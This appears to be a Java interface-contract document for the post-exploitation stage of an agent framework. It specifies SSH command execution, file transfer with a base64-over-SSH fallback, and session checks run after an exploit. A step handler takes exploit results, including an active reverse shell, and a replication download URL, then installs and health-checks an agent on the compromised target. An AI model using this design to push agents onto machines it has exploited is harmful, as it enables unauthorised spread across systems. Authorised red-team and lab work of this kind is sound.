# Interface Contracts: Remote Agent Transfer

## RemoteCommandExecutor

### Package

`com.spulido.agent.remote`

### Interface

```java
public interface RemoteCommandExecutor {

    /**
     * Executes a shell command on a remote target via SSH.
     *
     * @param session        the target session with IP, user, and optional identity file
     * @param command        the shell command to execute on the target
     * @param timeoutSeconds maximum time to wait for completion
     * @return TaskResult with stdout/stderr captured, exit code, and success/failure status
     */
    TaskResult execute(TargetSession session, String command, long timeoutSeconds);

    /**
     * Transfers file content to a remote target.
     * Attempts SCP first, falls back to base64 pipe over SSH.
     *
     * @param session     the target session with IP, user, and optional identity file
     * @param content     the file content as raw bytes
     * @param remotePath  the destination path on the target (e.g., "/tmp/agent")
     * @param permissions the file permissions to set (e.g., "755"); may be empty/null
     * @return TaskResult indicating success or failure of the transfer
     */
    TaskResult transferFile(TargetSession session, byte[] content, String remotePath, String permissions);
}
```

### Semantics

- `execute()`:
  - Builds SSH command with `-o StrictHostKeyChecking=no -o ConnectTimeout=10`
  - If `session.sshIdentityFile` is non-null, adds `-i <identityFile>`
  - Runs via `ProcessBuilder`, captures merged stdout/stderr, enforces timeout
  - Returns `TaskResult.success()` with output on exit 0
  - Returns `TaskResult.failure()` with output on non-zero exit or timeout

- `transferFile()`:
  - Writes `content` bytes to a local temp file first
  - **Attempt 1**: SCP via `ProcessBuilder("scp", "-o", "StrictHostKeyChecking=no", tempFile, user+"@"+ip+":"+remotePath)`
  - **Attempt 2** (if SCP fails): Retry SCP once
  - **Attempt 3** (if SCP failed twice): Base64 pipe — encode bytes to Base64, execute `echo '<base64>' | ssh ... 'base64 -d > <remotePath>'`
    - Checks content length against `transfer-file-max-size-mb` config; fails immediately if exceeded
  - After successful transfer, if `permissions` is non-empty, runs `chmod <permissions> <remotePath>` on target

### Error Handling

| Scenario | Result |
|----------|--------|
| SSH connectivity failure | `TaskResult.failure()` with "SSH connection to <ip> failed: <reason>" |
| Command timeout | `TaskResult.failure()` with "Command timed out after N seconds" |
| SCP not available | Falls through to base64 pipe (no error logged for SCP) |
| Binary too large for pipe | `TaskResult.failure()` with "Binary too large for pipe transfer (N MB > M MB max)" |
| base64 pipe failure | `TaskResult.failure()` with "Base64 pipe transfer failed: <reason>" |

### Security Constraints

- SSH identity file path MUST NOT appear in log output at INFO level or above
- Base64 content in log output MUST be truncated: `[N bytes base64]`
- Returned `TaskResult` messages MUST NOT contain the base64-encoded binary

---

## TargetSession

### Package

`com.spulido.agent.remote`

### Class

```java
public class TargetSession {
    private final String targetIp;
    private final String targetUser;
    private final String sshIdentityFile;

    public TargetSession(String targetIp, String targetUser, String sshIdentityFile) {
        // validate non-blank targetIp, non-blank targetUser
    }

    // Getters: getTargetIp(), getTargetUser(), getSshIdentityFile()
}
```

### Validation

- `targetIp`: non-blank, must match IPv4 pattern (basic validation, not strict)
- `targetUser`: non-blank
- `sshIdentityFile`: nullable; if non-null, must be non-blank

---

## SshSessionProvisioner

### Package

`com.spulido.agent.remote`

### Interface

```java
public interface SshSessionProvisioner {

    /**
     * Verifies SSH connectivity to a target after an exploit has completed.
     * Retries up to 3 times with 5-second intervals.
     *
     * @param targetIp      the IP address of the target
     * @param targetUser    the SSH username
     * @param identityFile  optional path to SSH identity file
     * @return true if SSH connectivity is confirmed, false otherwise
     */
    boolean verify(String targetIp, String targetUser, String identityFile);
}
```

### Semantics

- Executes: `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 <user>@<targetIp> 'echo OK'`
- If identity file provided: `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i <identityFile> <user>@<targetIp> 'echo OK'`
- Retry logic: up to 3 attempts with `Thread.sleep(5000)` between attempts
- Returns `true` if any attempt's stdout contains "OK" and exit code is 0
- Returns `false` if all 3 attempts fail

### Constructor

```java
public SshSessionProvisioner(AgentConfig config)
```

Uses `config.getDefaultTargetUser()` as the fallback user when `targetUser` is null/blank.

---

## Behavior Contract: TransferAgentStepHandler

### Inputs (from context)

| Context Key | Field | Type | Required |
|-------------|-------|------|----------|
| `EXECUTE_EXPLOIT` | logs containing `targetIp:...`, `targetUser:...`, `reverseShellActive:...` | `StepResult` | Yes |
| `REQUEST_REPLICATION` | `downloadUrl`, `preauthCode`, `centralUrl` | `StepResult` logs | Yes |

### Outputs

Returns `StepResult.success()` with logs documenting the transfer path, probe results, and health check outcome, or `StepResult.failure()` with failure reason.

### Tool Probing Contract

1. curl: `ssh target 'which curl && curl --version'` → exit 0 means available
2. wget: `ssh target 'which wget && wget --version'` → exit 0 means available
3. Central reachability: `ssh target 'curl -s --connect-timeout 5 <centralUrl>/actuator/health'` → exit 0 means reachable

### Path Selection

```
if (config.transferMethod == "http") → Path A (skip probe)
if (config.transferMethod == "transfer") → Path B (skip probe)
if (config.transferMethod == "auto") → probe, then:
    (curl available OR wget available) AND central reachable → Path A
    else → Path B
```

### Health Check Contract

- Command: `ssh target 'curl -s http://localhost:1222/actuator/health'`
- Retry: up to 3 attempts, 5-second delay between attempts
- Success: response contains "UP"
- Partial success: binary installed but health check never returns UP after 3 retries → `PARTIAL_SUCCESS`
